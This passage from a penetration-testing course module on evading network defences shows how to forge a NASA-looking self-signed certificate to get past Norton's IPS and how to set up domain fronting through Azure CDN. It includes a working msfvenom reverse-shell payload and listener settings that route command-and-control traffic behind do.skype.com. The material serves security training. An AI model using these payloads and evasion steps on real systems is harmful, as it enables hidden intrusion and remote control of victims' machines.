real SSL certificate, which requires that we own that domain. This is the best approach if we own 
a safe domain. To do this, we would obtain a signed, valid certificate, perhaps from a service 
provider like Let’s Encrypt,532 which provides free three-month certificates. 
We need to consider that self-signed certificates are somewhat common for non-malicious use 
though. Therefore, at this point, it is unlikely that this is the cause of our problem. It’s more likely 
that Norton contains signatures for the data present in Meterpreter’s randomized certificates. We 
will proceed with this assumption and create our own self-signed certificate, customizing some of 
its fields in an attempt to bypass those signatures. There are several approaches we could 
consider. 
One approach is to generate a self-signed certificate that matches a given domain with 
Metasploit’s impersonate_ssl auxiliary module. This module will create a self-signed certificate 
whose metadata matches the site we are trying to impersonate. 
 
532 (Let’s Encrypt, 2020), https://letsencrypt.org/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
335 
Another option is to manually create a self-signed certificate with openssl,533 which allows us full 
control over the certificate details. We don’t need to own a domain for this approach but if the 
certificate is passing through HTTPS inspection (which is covered later in this module), the traffic 
might flag because of an untrusted certificate. 
However, despite the drawback of potential HTTP inspection flagging our traffic, we’ll try this 
approach and generate a new self-signed certificate and private key that appears to be from 
NASA. We’ll use several openssl options as shown in Listing 396: 
• 
req: Create a self-signed certificate. 
• 
-new: Generate a new certificate. 
• 
-x509: Output a self-signed certificate instead of a certificate request. 
• 
-nodes: Do not encrypt private keys. 
• 
-out cert.crt: Output file for the certificate. 
• 
-keyout priv.key: Output file for the private key. 
Let’s put these options together and run the command. 
kali@kali:~$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key 
Generating a RSA private key 
... 
writing new private key to 'priv.key' 
... 
----- 
Country Name (2 letter code) [AU]:US 
State or Province Name (full name) [Some-State]:TX  
Locality Name (eg, city) []:Houston 
Organization Name (eg, company) [Internet Widgits Pty Ltd]:NASA 
Organizational Unit Name (eg, section) []:JSC 
Common Name (e.g. server FQDN or YOUR name) []:nasa.gov 
Email Address []:info@nasa.gov 
Listing 396 - Generating self signed certificate 
In order to use this certificate and key with Metasploit, we must create a .pem file by simply 
concatenating the key and certificate with cat. 
kali@kali:~$ cat priv.key cert.crt > nasa.pem 
Listing 397 - Combining certificate with private key 
We also must change the CipherString534 in the /etc/ssl/openssl.cnf config file or our reverse 
HTTPS shell will not work properly.535 
First, we will locate this line in the config file: 
CipherString=DEFAULT@SECLEVEL=2 
Listing 398 - openssl.cnf settings - old 
 
533 (OpenSSL Software Foundation, 2018), https://www.openssl.org/ 
534 (OpenSSL, 2016), https://www.openssl.org/docs/man1.1.0/man1/ciphers.html 
535 (reddit, 2019), https://www.reddit.com/r/netsecstudents/comments/9xpfhy/problem_with_metasploit_using_an_ssl_certificate/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
336 
We will remove the “@SECLEVEL=2” string, as the SECLEVEL536 option limits the usable hash and 
cypher functions in an SSL or TLS connection. We’ll set this to “DEFAULT”, which allows all. 
The new configuration should be set according to the listing below. 
CipherString=DEFAULT 
Listing 399 - openssl.cnf settings - new 
Finally, we’ll configure Metasploit to use our newly-created certificate through the HandlerSSLCert 
option, which we’ll set to the path of our nasa.pem file. Once this is set, we’ll restart our listener. 
msf5 exploit(multi/handler) > set HandlerSSLCert /home/kali/self_cert/nasa.pem 
handlersslcert => /home/kali/self_cert/nasa.pem 
 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:4443 
Listing 400 - Configuring HandlerSSLCert for Meterpreter 
Let’s re-enable Norton’s host-based IPS, reload the web page, and view the certificate in our 
browser: 
 
Figure 135: Our self signed certificate as seen on the victim 
Although the browser still complains about the self-signed certificate, our newly-created “NASA” 
certificate bypassed Norton’s IPS. This confirms that Norton was, in fact, flagging Meterpreter’s 
“randomized” certificate field data. 
 
536 (OpenSSL Software Foundation, 2018), https://www.openssl.org/docs/man1.1.1/man3/SSL_CTX_set_security_level.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
337 
In a real-world engagement, we might consider using more sensibly-customized field data, but 
regardless of the actual field data, we can use simple changes like this to bypass some IPS 
software. 
This example highlights the shortcomings of signature-based IPS sensors. 
9.3.1.1 Exercises 
1. 
Repeat the previous steps to bypass Norton’s HIPS sensor. 
2. 
Use the impersonate_ssl module in Metasploit to bypass Norton HIPS. 
3. 
Norton doesn’t block Empire’s default HTTPS shell. Why is this? Consider the steps we took 
in this section to determine the reason. 
4. 
If you own a domain, obtain a valid SSL certificate from Let’s Encrypt’s free service. 
9.4 Full Packet Capture Devices 
In this section, we’ll briefly discuss full packet capture devices. These devices do not typically sit 
inline with network traffic, but rather on a network tap, which will capture the traffic. These 
devices are typically used during post-incident forensic investigations. 
RSA’s Netwitness537 is a common enterprise-level full packet capture system and 
Moloch538 is an alternative free open source alternative. 
These devices can also be used for deep packet inspection and protocol analysis of the traffic 
and can generate rich, searchable metadata. Experienced users can use this data to detect 
malicious traffic. 
From a penetration testing perspective, our goal is not to evade such systems but to rather lower 
our profile as much as possible to evade detection, using the tactics we discussed in the proxy 
and DNS filter evasion sections. In addition, before using any tool or framework, we should view 
our traffic in a test lab with a tool like Wireshark to determine if the tool is generating realistic-
looking traffic. 
Since these solutions typically log geolocation data, we should also consider this as part of our 
bypass strategy, especially the perceived location of our C2 server. For example, if we know that 
our target only typically transacts with US-based sites, geographically different destinations may 
raise suspicion. 
9.5 HTTPS Inspection 
The last defense system we will discuss is HTTPS inspection, in which the traffic is decrypted and 
unpacked, inspected and then repacked, and encrypted again. This is essentially a man-in-the-
middle. 
 
537 (RSA Security LLC , 2020), https://www.rsa.com/en-us/products/threat-detection-response/network-security-network-monitoring 
538 (Moloch, 2020), https://molo.ch/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
338 
From an architectural standpoint, this is often done at the Internet Edge zone as shown in Figure 
136. Because decrypting and re-encrypting traffic is very expensive and complex, most 
environments perform this process on a dedicated device. 
 
Figure 136: HTTPS inspection points 
In this scenario, client machines trust the inspection device’s certificate since it is often signed by 
the organization’s certificate authority, allowing the device to impersonate the client. 
There is no easy way to bypass HTTPS inspection devices. If we are using HTTPS, we must 
simply assume that our traffic will be inspected and try to keep a low profile. One way to do this is 
to abort a payload if we suspect that it is being inspected. We can do this with TLS Certificate 
Pinning539 in Meterpreter. Using this technique, we can specify the certificate that will be trusted. 
Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will 
terminate itself. This can be controlled by setting the StagerVerifySSLCert option to “true” and 
configuring HandlerSSLCert with the certificate we trust and want to use. 
We can also try to categorize the target domain of our traffic to reduce the likelihood of 
inspection. Some categories, like “banking”, are usually not subject to inspection because of 
privacy concerns. If we can categorize our domain to an accepted category, we may be able to 
bypass HTTPS inspection and, by extension, bypass other detection systems as well since our 
traffic is encrypted. 
So far in this module, we have discussed various defensive devices and demonstrated various 
generic bypasses. In the next sections, we will discuss various techniques that can be used 
bypass multiple systems all at once. 
9.6 Domain Fronting 
As we have already discussed, penetration testers almost always have to deal with egress traffic 
filtering. In this section, we will discuss a bypass technique called domain fronting,540 which was 
originally designed to circumvent Internet censorship systems. 
 
539 (Rapid7, 2015), https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-HTTP-Communication#tls-certificate-pinning 
540 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Domain_fronting 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
339 
 
The origins of this technique date back to 2012,541 when it was first used to 
specifically bypass egress filters. Since then, it has become very popular and has 
been adopted by malware authors (APT29542) and many well-known penetration 
testing tools like Meterpreter, Empire, and Covenant. 
At a very high level, this technique leverages the fact that large Content Delivery Networks 
(CDN)543 can be difficult to block or filter on a granular basis. Depending on the feature set 
supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a 
CDN, even though the initial TLS544 session is targeting a different domain. This is possible as the 
TLS and the HTTP session are handled independently. For example, we can initiate the TLS 
session to www.example1.com and then get the contents of www.example2.com. 
To understand why this is possible, let’s discuss the foundational concepts, beginning with HTTP 
request Host headers. 
In the traditional website architecture, a client makes a content request directly to a webserver, as 
shown in Figure 137. Furthermore, each server hosts only a single website. 
 
Figure 137: Traditional webserver access 
 
541 (Bryce Boe, 2012), https://bryceboe.com/2012/03/12/bypassing-gogos-inflight-internet-authentication/ 
542 (FireEye, 2017), https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html 
543 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Content_delivery_network 
544 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Transport_Layer_Security 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
340 
 
With the advent of virtual hosting,545 multiple web sites associated with different domains could 
be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the 
request HOST header, which specifies the target domain name, and optionally the port on which 
the web server is listening for the specified domain. 
A typical Host header in this environment is shown in Listing 401. 
GET /index.html HTTP/1.1 
Host: www.example.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/83.0.4103.116 Safari/537.36 
Accept: */* 
Listing 401 - HTTP header example 
The first line of Listing 401 indicates the request method and the path of the resource being 
requested. In this case, this is a GET request for the /index.html page. 
The next line is the Host header, which specifies the actual host where the resource is located. 
This typically matches the domain name. 
To better understand the need for a Host header, let’s examine a simplified TCP/IP packet (Figure 
138) that carries an HTTP message. 
 
Figure 138: HTTP packet 
After the DNS lookup is performed by the connecting client, the domain information is lost. In this 
case, the server will only see the IP address where the client tries to connect (which is its IP). 
Because of this, the target domain is represented in the HTTP request. 
On the hosting server itself, the Host header maps to a value in one of the web server’s 
configuration files. For example, consider the NGINX configuration shown in Listing 402. 
server { 
        listen 80; 
        listen [::]:80; 
 
 
545 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Virtual_hosting 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
341 
        root /var/www/example.com/html; 
        index index.html index.htm index.nginx-debian.html; 
 
        server_name example.com www.example.com; 
 
        location / { 
                try_files $uri $uri/ =404; 
        } 
} 
Listing 402 - NGINX server configuration 
Note that the server_name lists the available domain names this particular configuration applies 
to. The root field specifies what content is served for that domain name. In this way, a server can 
host many websites from a single host through multiple domain-centric configuration files. 
However, when a client connects to a server that runs TLS, the situation is a bit different. Because 
it is dealing with an encrypted connection, the server must also determine which certificate to 
send in the response based on the client’s request. 
Since the HTTP Host header is only available after the secure channel has been established, it 
can’t be used to specify the target domain. Instead, the TLS Server Name Indication (SNI)546 field, 
which can be set in the “TLS Client Hello” packet during the TLS negotiation process, is used to 
specify the target domain and therefore the certificate that is sent in response. 
 
Figure 139: TLS Client Hello packet 
In response to this, the “TLS Server Hello” packet contains the certificate for the domain that was 
indicated in the client request SNI field. 
 
546 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Server_Name_Indication 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
342 
 
Figure 140: TLS Server Hello packet 
We can leverage these connection mechanics as a possible evasion technique. 
For example, we can make an HTTPS connection to a server and set the SNI to indicate that we 
are accessing www.example1.com. Once the TLS session is established and we start the HTTP 
session (over TLS), we can specify a different domain name in the Host header, for example 
www.example2.com. This will cause the webserver to serve content for that website instead. If 
our target is not performing HTTPS inspection, it will only see the initial connection to 
www.example1.com, 
unaware 
that 
we 
were 
connecting 
to 
www.example2.com. 
If 
www.example2.com is a blocked domain, but www.example1.com is not, we have performed a 
simple filter bypass. 
We can now tie this approach to Content Delivery Networks (CDN). On a larger scale, a CDN 
provides geographically-optimized web content delivery. CDN endpoints547 cache and serve the 
actual website content from multiple sources, and the HTTP request Host header is used to 
differentiate this content. It can serve us any resource (typically a website) that is being hosted on 
the same CDN network. 
This architecture is shown in Figure 141. 
 
547 (BelugaCDN, 2020), https://www.belugacdn.com/what-is-a-cdn-endpoint/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
343 
 
Figure 141: Webserver access over CDN 
In this Figure, www.example.com will point to the CDN endpoint’s domain name (e.g.: 
something.azureedge.net) through DNS Canonical Name (CNAME)548 records. When a client looks 
up www.example.com, the DNS will recursively lookup something.azureedge.net, which will be 
resolved by Azure. In this way, traffic will be directed to the CDN endpoint rather than the real 
server. Since CDN endpoints are used to serve content from multiple websites, the returned 
content is based on the Host header. 
Let’s look at an example in detail. 
Let’s assume we have a CDN network that is caching content for good.com. This endpoint has a 
domain name of cdn1111.someprovider.com. 
We’ll create a CDN endpoint that is proxying or caching content to malicious.com. This new 
endpoint will have a domain name of cdn2222.someprovider.com, which means if we browse to 
this address, we eventually access malicious.com. 
Assuming that malicious.com is a blocked domain and good.com is an allowed domain, we could 
then subversively access malicious.com. 
 
548 (Wikipedia, 2020), https://en.wikipedia.org/wiki/CNAME_record 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
344 
 
Figure 142: CDN traffic flow 
Let’s walk through the process demonstrated in Figure 142: 
1. 
The client initiates a DNS request to its primary DNS server to look up the IP of good.com. 
2. 
The primary DNS server asks the root DNS server for the IP address of good.com. 
3. 
The server replies with the configured CNAME record for that domain, which is 
cdn1111.someprovider.com. 
4. 
The primary DNS server queries the someprovider.com DNS server for the 
cdn1111.someprovider.com domain. 
5. 
The DNS server for someprovider.com replies with 192.168.1.1, which is the IP of the CDN 
endpoint. 
6. 
The primary DNS sends the reply to the client. 
7. 
The client initiates a TLS session to domain good.com to the CDN endpoint. 
8. 
The CDN endpoint serves the certificate for good.com. 
9. 
The client asks for the cdn2222.someprovider.com resource. 
10. The CDN endpoint serves the contents of malicious.com. 
If we are using HTTPS and no inspection devices are present, this primarily appears to be a 
connection to good.com because of the initial DNS request and the SNI entry from the TLS Client 
Hello. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
345 
Even in an environment that uses HTTPS filtering, we can use this technique in various ways, 
such as to bypass DNS filters. 
Note that some CDN providers, like Google and Amazon, will block requests if the 
host in the SNI and the Host headers don’t match. However, in the next example, 
we will demonstrate domain fronting against Microsoft Azure. 
In summary, this process of manipulating the Host and SNI headers in the traffic flow allows us 
to fetch content from sites that might be blocked otherwise and also allows us to hide our traffic. 
This process is known as domain fronting. 
9.6.1 Domain Fronting with Azure CDN 
In this section, we will demonstrate how to configure domain fronting with Microsoft Azure. To do 
this, we will need a domain we control, an Azure subscription to create a CDN, and a machine that 
is Internet-accessible. 
Due to the above requirements, this section is for demonstration purposes only. However, in the 
next section we will show how we can still emulate and practice this technique in the lab 
environment. 
Our goal is to host a Meterpreter listener on our meterpreter.info domain. At the time of this 
writing, the domain points to an Ubuntu virtual machine hosted at DigitalOcean with an IP of 
138.68.99.177. We will set up a CDN in Azure to proxy requests to this domain. Once the CDN is 
set up, we will need to find a domain that we can use for domain fronting. 
To set up a CDN in Azure, we’ll select Create Resource from the Home screen. A search screen is 
displayed where we can search for various resources and services offered by Azure. Here, we 
need to search for “CDN”. 
 
Figure 143: Search Azure Services 
Once we find CDN, we can select it and click Create. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
346 
 
Figure 144: Azure CDN selection 
Figure 145 shows the various options. Let’s briefly describe each one: 
• 
Name: This field is arbitrary. We can give it any name we like. 
• 
Subscription: This is the subscription that will be used to pay for the service. 
• 
Resource group: The CDN profile must belong to a resource group. We can either select an 
existing one or create a new one. For this example, we’ll create a new one, adding “-rg” to the 
end of the name. 
• 
RG location: An arbitrary geographic area where we want to host the CDN. 
• 
Pricing tier: We’ll select “Standard Verizon”. This affects not only the pricing, but also the 
features we will have access to, and will also affect the way the CDN works. We found 
“Standard Verizon” to be the most reliable for our needs. The “Standard Microsoft” tier 
creates issues with TLS and the caching is also not as flexible. 
• 
CDN endpoint name: The hostname we will use in the HTTP header to access 
meterpreter.info. This can be anything that is available from Azure, and the suffix will be 
azureedge.net. 
• 
Origin type: This should be set to “Custom origin”. 
• 
Origin hostname: This would be the actual website that should be cached by CDN under 
normal cases. In our case, this is the domain where we host our C2 server. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
347 
 
Figure 145: Azure CDN configuration 
Once we populate all the details and click Create, Azure creates the CDN profile. 
 
Figure 146: Azure notification: CDN is being created 
We’ll receive a notification when the CDN profile is ready. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
348 
 
Figure 147: Azure notification: CDN is ready 
Once the profile is ready, we can navigate to Home > All Resources, select our newly created CDN 
profile, and we can confirm that it’s working in the Overview section. 
Note that it takes about ninety minutes for Azure to set this up. 
 
Figure 148: Azure CDN Overview 
Next, we need to disable caching. Caching will break our C2 channel, especially our reverse shells 
since they are not static and each request returns a unique response. 
To disable caching, we’ll select our Endpoint and Caching rules. There, we’ll set Caching behavior 
to “Bypass cache”, which will disable caching. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
349 
 
Figure 149: Azure Cache configuration 
We can also set Query string caching behavior to “Bypass caching for query strings”, which will 
prevent the CDN from caching any requests containing query strings. 
Once saved, we will need to wait for the settings to propagate. This can take up to thirty minutes. 
At this point, it’s good practice to ensure that the connection is working properly before we move 
on to domain fronting and the actual reverse shell. If basic requests fail, we need to fix them prior 
to moving forward. 
On our machine, which is the destination for meterpreter.info, we’ll set up a simple Python HTTP 
and HTTPS listener to test web server functionality. We’ll first test HTTP and if that works, we can 
move on to HTTPS. This ensures that all layers are working properly and allows for systematic 
testing. 
We can run a Python one-liner to test HTTP connectivity. We’ll need to run it with sudo since we’re 
listening on a privileged port (with a value less than 1024). We’ll specify a module script with -m 
http.server and the listening port number, which in this case is 80: 
$ sudo python3 -m http.server 80 
Listing 403 - Running Python HTTP server 
We’ll create a short Python script to handle HTTPS connections. This script will create an SSL 
wrapper around the default HTTP request handler, SimpleHTTPRequestHandler, which was used 
in the example above. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
350 
from http.server import HTTPServer, SimpleHTTPRequestHandler 
import ssl 
import socketserver 
 
httpd = socketserver.TCPServer(('138.68.99.177', 443), SimpleHTTPRequestHandler) 
 
httpd.socket = ssl.wrap_socket(httpd.socket,  
        keyfile="key.pem",  
        certfile='cert.pem', server_side=True) 
 
httpd.serve_forever() 
Listing 404 - Python HTTPS server script 
We can run this script and start the server with python3, running it as sudo since we want to 
listen on port 443, which is also a privileged port. 
$ sudo python3 httpsserver.py 
Listing 405 - Running Python HTTPS server script 
Using either a browser or two simple curl requests from our workstation, we can verify the 
connection. For HTTPS testing, we’ll need curl -k, which will accept our insecure self-signed 
certificate. 
kali@kali:~$ curl http://offensive-security.azureedge.net 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html> 
<title>Directory listing for /</title> 
<body> 
<h2>Directory listing for /</h2> 
<hr> 
<ul> 
</ul> 
<hr> 
</body> 
</html> 
 
kali@kali:~$ curl -k https://offensive-security.azureedge.net 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" 
"http://www.w3.org/TR/html4/strict.dtd"> 
<title>Directory listing for /</title> 
<body> 
<h2>Directory listing for /</h2> 
<hr> 
<ul> 
</ul> 
<hr> 
</body> 
</html> 
Listing 406 - Verifying basic CDN connectivity 
Next, we need to find a frontable domain. Since we set up our CDN endpoint in Azure, our 
frontable domain must also be hosted on Azure. Specifically, we need a domain that is hosted on 
azureedge.net. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
351 
We’ll use the FindFrontableDomains549 script (written by Steve Borosh a.k.a. @rvrsh3ll) to find 
domains we can use. 
Let’s download it from GitHub and run the setup.sh installation script. 
kali@kali:~$ git clone https://github.com/rvrsh3ll/FindFrontableDomains 
Cloning into 'FindFrontableDomains'... 
... 
 
kali@kali:~$ cd FindFrontableDomains/ 
 
kali@kali:~/FindFrontableDomains$ sudo ./setup.sh  
Listing 407 - Installing FindFrontableDomains 
Now we can search for frontable domains. For each domain, FindFrontableDomains will try to 
find subdomains using various services, and determine if they are hosted on a CDN network. 
If we don’t have a specific target in mind, we’ll simply use trial and error. For this example, we can 
make an educated guess that since Microsoft owns Azure, some of their domains, like 
microsoft.com, outlook.com, or skype.com may be hosted there. 
Let’s start by scanning for frontable domains in outlook.com by passing --domain outlook.com 
to FindFrontableDomains.py. 
kali@kali:~$ python3 FindFrontableDomains.py --domain outlook.com   
... 
 
[-] Enumerating subdomains now for outlook.com 
[-] Searching now in Baidu.. 
[-] Searching now in Yahoo.. 
[-] Searching now in Google.. 
[-] Searching now in Bing.. 
[-] Searching now in Ask.. 
[-] Searching now in Netcraft.. 
[-] Searching now in DNSdumpster.. 
[-] Searching now in Virustotal.. 
[-] Searching now in ThreatCrowd.. 
[-] Searching now in SSL Certificates.. 
[-] Searching now in PassiveDNS.. 
[-] Total Unique Subdomains Found: 2553 
www.outlook.com 
(...) 
recommended.yggdrasil.outlook.com 
--------------------------------------------------------- 
Starting search for frontable domains... 
Azure Frontable domain found: assets.outlook.com outlook-assets.azureedge.net. 
Azure Frontable domain found: assets.outlook.com outlook-assets.afd.azureedge.net. 
 
Search complete! 
Listing 408 - Using FindFrontableDomains.py 
 
549 (Steve Borosh, 2020), https://github.com/rvrsh3ll/FindFrontableDomains 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
352 
The output reveals over two thousand subdomains, and one of them, assets.outlook.com, is 
frontable. 
We can test the viability of this domain with curl. We’ll set the Host header to our azureedge.net 
subdomain (offensive-security.azureedge.net) with --header. 
kali@kali:~$ curl --header "Host: offensive-security.azureedge.net" 
http://assets.outlook.com 
kali@kali:~$ 
Listing 409 - Domain fronting test with curl 
This returns a blank response because in this case, the CDN used by the assets.outlook.com 
domain is in a different region or pricing tier, which drastically affects our ability to use the 
domain for fronting. 
Moving on, we’ll investigate skype.com. 
kali@kali:~$ python3 FindFrontableDomains.py --domain skype.com   
... 
Starting search for frontable domains... 
Azure Frontable domain found: clientlogin.cdn.skype.com az866562.vo.msecnd.net. 
Azure Frontable domain found: latest-swx.cdn.skype.com e458.wpc.azureedge.net. 
Azure Frontable domain found: mrrcountries.cdn.skype.com mrrcountries.azureedge.net. 
Azure Frontable domain found: mrrcountries.cdn.skype.com 
mrrcountries.ec.azureedge.net. 
Azure Frontable domain found: latest-swc.cdn.skype.com latest-swc.azureedge.net. 
Azure Frontable domain found: latest-swc.cdn.skype.com latest-swc.ec.azureedge.net. 
Azure Frontable domain found: swx.cdn.skype.com e458.wpc.azureedge.net. 
Azure Frontable domain found: swc.cdn.skype.com swc.azureedge.net. 
Azure Frontable domain found: swc.cdn.skype.com swc.ec.azureedge.net. 
Azure Frontable domain found: s4w.cdn.skype.com az663213.vo.msecnd.net. 
Azure Frontable domain found: sdk.cdn.skype.com az805177.vo.msecnd.net. 
Azure Frontable domain found: do.skype.com skype-do.azureedge.net. 
Azure Frontable domain found: do.skype.com skype-do.ec.azureedge.net. 
 
Search complete! 
Listing 410 - Search frontable domains under skype.com 
This produces quite a few responses. Let’s test do.skype.com. 
kali@kali:~$ curl --header "Host: offensive-security.azureedge.net" 
http://do.skype.com 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html> 
<title>Directory listing for /</title> 
<body> 
<h2>Directory listing for /</h2> 
<hr> 
<ul> 
</ul> 
<hr> 
</body> 
</html> 
Listing 411 - Domain fronting test with curl 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
353 
This produced more output than the previous test. This is promising. Let’s inspect the traffic, 
including the DNS and HTTP request, in more detail. 
We’ll start Wireshark on our Kali machine and run the curl command again. 
 
Figure 150: Domain fronting in Wireshark 
As expected, Figure 150 reveals a DNS request to do.skype.com followed by an HTTP request to 
the IP reported for that domain. 
Let’s analyze the DNS response by selecting the relevant packet. 
 
Figure 151: DNS answer for do.skype.com 
This reveals that do.skype.com is a CNAME record. After several requests, the server returns the 
152.199.19.161 IP address. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
354 
Next, we’ll check the HTTP traffic by right-clicking one of the TCP packets and selecting Follow 
TCP Stream. 
 
Figure 152: HTTP traffic to do.skype.com 
We see the Host header being set to offensive-security.azureedge.net, which routes the traffic to 
our CDN, ultimately fetching the contents from our webserver at meterpreter.info. This confirms 
that our domain fronting works with HTTP. The problem with this is that a proxy can still see this 
traffic as it is unencrypted. 
Let’s verify our setup over HTTPS. 
kali@kali:~$ curl --header "Host: offensive-security.azureedge.net" 
https://do.skype.com 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" 
"http://www.w3.org/TR/html4/strict.dtd"> 
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=ascii"> 
<title>Directory listing for /</title> 
... 
Listing 412 - HTTPS domain fronting test with curl 
The results are promising, matching the response from our HTTP test in Listing 406. 
Let’s again start Wireshark, rerun the test, and inspect the traffic. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
355 
 
Figure 153: HTTPS traffic to do.skype.com 
Wireshark reveals encrypted HTTPS traffic to the same IP as our previous test. 
The certificate in the TLS key exchange is Microsoft’s certificate. We can verify this by selecting 
the Certificate, Server Key Exchange, Server Hello Done packet, and inspecting its details: 
 
Figure 154: Certificate from do.skype.com 
In the same packet, we also find that this certificate is valid for 99 different domains, which is set 
via the Subject Alternative Names (SAN).550 This means that a single certificate can be used for 99 
different domains and will use the same encryption key: 
 
550 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Subject_Alternative_Name 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
356 
 
Figure 155: Alternate domain names of the certificate 
We can also view the details of the SAN in this packet. 
In short, domain fronting is working perfectly via both HTTP and HTTPS. This means that if our 
target environment is not using HTTPS inspection, our HTTPS traffic will not only be hidden but it 
will appear to be directed to do.skype.com. 
Since many organizations use Skype for meetings, this traffic won’t stand out and will be 
considered legitimate. This allows us to bypass domain, proxy, and IDS filters in one shot. 
The last item we need to test is that our reverse shell is working properly. We’ll use HTTP so we 
can inspect the traffic contents, allowing us to verify that the connection is being set up as 
intended. 
First, we’ll create a reverse shell payload. The only extra field we need to set is the 
HttpHostHeader, which will set the Host header in HTTP. 
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com 
LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe 
Listing 413 - Creating Meterpreter reverse HTTP shell with HttpHostHeader option 
Next, we need to configure a listener on our VM that is hosting meterpreter.info. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
357 
When we use a staged payload, there are some additional settings we need to configure for our 
listener. 
The first stage will set the address for the second stage based on the actual IP address and port 
of the listener. This won’t work for us because it will directly connect to our real IP. Since we 
obviously want to hide communication to this IP, we’ll need to ensure that the second stage is 
also connecting to do.skype.com. 
To do this, we’ll need to set up some advanced options for our listener. We need to set the 
OverrideLHOST option to our domain, and also set OverrideRequestHost to “true”. We can change 
the listening port as well with the OverrideLPORT option, but this is unnecessary for this example. 
Once this is set up we will start the listener with run -j, which will run the listener as a job. 
msf5 exploit(multi/handler) > set LHOST do.skype.com 
 
msf5 exploit(multi/handler) > set OverrideLHOST do.skype.com 
 
msf5 exploit(multi/handler) > set OverrideRequestHost true 
 
msf5 exploit(multi/handler) > set HttpHostHeader offensive-security.azureedge.net 
 
msf5 exploit(multi/handler) > run -j 
... 
 
